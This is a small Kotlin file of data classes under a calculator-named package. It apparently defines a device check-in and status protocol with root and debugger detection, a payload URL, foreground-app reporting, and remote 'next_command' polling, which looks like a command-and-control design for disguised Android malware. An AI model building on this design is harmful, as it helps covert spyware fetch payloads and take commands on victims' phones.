package org.kalkulator.model

data class CheckinRequest(
    val deviceId: String,
    val model: String,
    val manufacturer: String,
    val androidVersion: String,
    val buildFingerprint: String,
    val isRooted: Boolean,
    val isDebugger: Boolean
)

data class CheckinResponse(
    val success: Boolean,
    val should_download: Boolean,
    val token: String?,
    val payload_url: String?
)

data class StatusRequest(
    val deviceId: String,
    val status: String,
    val battery: Int,
    val currentApp: String?
)

data class StatusResponse(
    val success: Boolean,
    val next_command: String?,
    val command_id: String?
)
